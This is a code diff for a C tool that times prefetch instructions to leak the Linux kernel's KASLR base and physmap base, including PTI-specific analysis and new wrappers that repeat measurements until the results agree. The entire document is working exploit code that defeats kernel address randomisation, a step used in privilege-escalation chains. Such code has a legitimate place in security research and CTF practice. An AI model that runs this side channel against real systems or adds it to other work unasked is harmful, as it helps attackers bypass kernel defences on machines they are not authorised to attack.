@@ -7,7 +7,6 @@ uint64_t sidechannel(size_t addr) {
     "rdtscp;"
     "mov %0, rax;"
     "mov %1, rdx;"
-    "xor rax, rax;"
     "mfence;"
     "prefetcht0 qword ptr [%4];"
     "prefetcht0 qword ptr [%4];"
@@ -33,36 +32,28 @@ void clean_cache(size_t base){
         size_t probe = (mess*0x1000+base);
         // prefecth access
         sidechannel(probe);
-        // If we don't do clean_cache, we lose some suceess rate
-        // Just about 0.8 sec
-        // probe = 1;
     }
 }
 
 
-uint64_t leak_syscall_entry(int pti,int boost) 
+u64 leak_syscall_entry(int pti) 
 {
-    char *trash = malloc(0x100000);
-    uint64_t data[ARR_SIZE] = {0};
-    uint64_t min = ~0, addr = ~0;
-
-    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
+    sched_yield();
+    u64 data[ARR_SIZE] = {0};
+    u64 min = ~0, addr = ~0;
+    for (int i = 0; i < ITERATIONS + 2; i++)
     {
-        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) 
+        for (u64 idx = 0; idx < ARR_SIZE; idx++) 
         {
-            
             // syscall(0x68);
-            // Arbitrary SYSCALL is fine, I use this to avoid accessing other code
-            // It should go into syscall and return quickly
+            // sched_yield();
             syscall(0x144,0x132,0x132); // Makes no diff but a little faster
-            uint64_t time = sidechannel(SCAN_START + idx * STEP);
-            if(!boost)
-                clean_cache((size_t)trash);
-            if (i >= DUMMY_ITERATIONS)
+            u64 time = sidechannel(SCAN_START + idx * STEP);
+            // clean_cache((size_t)trash);
+             if (i >= 2)
                 data[idx] += time;
         }
     }
-
     for (int i = 0; i < ARR_SIZE; i++)
     {
         data[i] /= ITERATIONS;
@@ -71,18 +62,14 @@ uint64_t leak_syscall_entry(int pti,int boost)
             min = data[i];
             addr = SCAN_START + i * STEP;
         }
-        // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
     }
     if(pti){
-        int previous_data = data[1];
+        u64 previous_data = data[0];
         // More analysis for pti
-        for(int i = 2; i< ARR_SIZE; i++)
+        for(int i = 0x1; i< ARR_SIZE; i++)
         {
-            if(data[i]>previous_data*1.1)
-            {
-                //outliner
+            if(data[i]>previous_data*1.1) // outliner
                 continue;
-            }
             // Find the `dent`
             if( data[i]< previous_data && previous_data-data[i] > 0.15*previous_data && data[i]<min*1.05)
             {
@@ -94,66 +81,57 @@ uint64_t leak_syscall_entry(int pti,int boost)
     }
     return addr;
 }
-
-size_t leakKASLR(int pti, size_t offset, int boost){
-    size_t val = leak_syscall_entry(pti,boost) + offset;
-    // No pti so we leaked the address of Kernel Starts instead of entry_SYSCALL_64
-    if(!pti) 
-        val = val - entry_SYSCALL_64_offset;
-    printf ("KASLR  base %p\n", (void *)val);
-    return val;
+size_t get_kaslr(int pti){
+    return leak_syscall_entry(pti);
 }
-
-
-uint64_t leak_phys(void) 
+u64 _leak_phys(size_t pti) 
 {
-    uint64_t data[ARR_SIZE_PHYS] = {0};
-    uint64_t min = ~0, addr = ~0;
+    // When pti = on, make sure pcid is on for /proc/cpu
+    if(pti==1){
+        
+        panic("You may provide an offset of the kernel page on user space, e.g., 0x11c132000");
+        exit(1);
+    }
+    sched_yield();
+
+    u64 data[ARR_SIZE_PHYS] = {0};
+    u64 min = ~0, addr = ~0;
     for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
     {
-        for (uint64_t idx = 0; idx < ARR_SIZE_PHYS; idx++) 
+        for (u64 idx = 0; idx < ARR_SIZE_PHYS; idx++) 
         {
 
-            uint64_t test = SCAN_START_PHYS + idx * STEP_PHYS;
-            syscall(104); 
-
-            uint64_t time = sidechannel(test);
+            u64 probe = SCAN_START_PHYS + idx * STEP_PHYS + pti;
+            syscall(0x144,0x132,0x132); // Makes no diff but a little faster
+            u64 time = sidechannel(probe);
+            
             if (i >= DUMMY_ITERATIONS)
                 data[idx] += time;
         }
     }
-    // for(int i = 0 ; i < 0x100; i++)
-    // {
-    //     printf("[x] %p\n",data[i]);
-    // }
-    for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
-    {
-        data[i] /= ITERATIONS;
-        if (data[i] < min)
+    // We start at 0x40 since we warmed up 0x40 times before it
+
+        for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
         {
-            min = data[i];
-            addr = SCAN_START_PHYS + i * STEP_PHYS;
-            // printf("[X] Cur: %p, Pre: %p, Addr: %p\n",data[i],data[i-1],addr);
+            data[i] /= ITERATIONS;
+            if (data[i] < min)
+            {
+                min = data[i];
+                addr = SCAN_START_PHYS + i * STEP_PHYS ;
+            }
         }
-    }
-
-    int previous_data = data[0x40];
-
-    
+        int previous_data = data[0x40];
         // More analysis for pti
         for(int i = 0x41; i< ARR_SIZE_PHYS; i++)
         {
             if(data[i]>previous_data*1.1)
-            {
-                //outliner
                 continue;
-            }
-      
+    
             if( data[i]< previous_data && \
                 (double)previous_data*0.9375 > (double)data[i] && \
                 data[i] < min*1.0625 )
             {
-                addr = SCAN_START_PHYS + i * STEP_PHYS;
+                addr = SCAN_START_PHYS + i * STEP_PHYS ;
                 break;
             }
             previous_data = data[i];
@@ -161,9 +139,34 @@ uint64_t leak_phys(void)
     
     return addr;
 }
-size_t leakPHYS(size_t offset){
-    size_t val =  leak_phys();
-    printf ("PHYSMAP base %p\n",(void *)val);
-    return val;
+size_t _find_duplicate(size_t a, size_t b, size_t c) {
+    if (a == b || a == c)
+        return a;
+    if (b == c)
+        return b;
+    return 0; // all different
 }
-
+size_t get_kaslr_precise(int pti){
+    size_t val[3];
+    for(int i = 0; i < 3 ; i++)
+        val[i] = get_kaslr(pti);
+    size_t res = _find_duplicate(val[0],val[1],val[2]);
+    if(res)
+        return res;
+    else
+        return get_kaslr_precise(pti);
+    
+}
+size_t get_physmap(size_t pti){
+    return _leak_phys(pti);
+}
+size_t get_physmap_precise(size_t pti){
+    size_t val[3];
+    for(int i = 0; i < 3 ; i++)
+        val[i] = _leak_phys(pti);
+    size_t res = _find_duplicate(val[0],val[1],val[2]);
+    if(res)
+        return res;
+    else
+        return get_physmap_precise(pti);
+}
